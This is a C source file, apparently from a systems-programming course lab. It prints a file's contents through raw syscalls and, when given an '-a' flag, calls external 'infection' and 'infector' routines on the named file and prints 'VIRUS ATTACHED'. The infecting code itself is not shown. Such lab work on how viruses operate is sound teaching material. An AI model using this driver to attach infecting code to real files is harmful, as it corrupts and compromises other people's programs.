#include "util.h"
#define SYS_WRITE 4
#define SYS_READ 3
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDONLY 0
#define O_WRONLY 1
#define O_RDWR 2
#define O_CREAT 64
#define O_TRUNC 512
#define O_APPEND 1024

extern int system_call();
extern void infection();
extern void infector(char *);

int main(int argc, char** argv) {
    if (argc <2){
        return 0;
    }
    char * inFile = argv[1];

    int flagA = 0;
    if (strlen(inFile) > 2 && strncmp(inFile,"-a",2) == 0){
        flagA = 1;
        inFile = inFile+2;
        if (strcmp(inFile, "start.s") == 0
            || strcmp(inFile, "main.c") == 0
            || strcmp(inFile, "makefile") == 0){

            system_call(SYS_WRITE, STDOUT, "nice try\n", strlen("nice try\n"));
            return 0x55;
        }
    }


    int file = system_call(SYS_OPEN, inFile, O_RDWR|O_CREAT|O_APPEND, 0644);
    char buffer[1];
    while(system_call(SYS_READ, file, buffer, 1) > 0) {
        system_call(SYS_WRITE, STDOUT, buffer, 1);
    }
    system_call(SYS_WRITE, STDOUT, "\n", 1);


    if(flagA == 1){
        infection();
        infector(inFile);

        system_call(SYS_WRITE,STDOUT,"VIRUS ATTACHED\n", strlen("VIRUS ATTACHED\n"));
    }

    return 0;
}

